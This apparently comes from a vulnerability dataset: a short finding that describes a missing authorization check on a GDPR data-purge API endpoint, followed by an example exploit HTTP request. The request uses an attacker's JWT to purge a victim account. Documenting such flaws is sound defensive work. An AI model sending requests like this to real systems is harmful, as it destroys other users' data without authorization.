diagnosis: The API endpoint starts a Temporal GDPR data purge workflow using accountId from the request body. Although it checks for a valid JWT via authenticateJwt, it fails to verify that req.user.accountId matches accountId or that the caller is an authorized compliance officer. Any user can trigger irrecoverable data purge workflows on other accounts.
exploit_request:
POST /api/workflows/gdpr-purge HTTP/1.1
Host: app.dataprivacy.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"accountId": "acc_enterprise_victim_7741"}
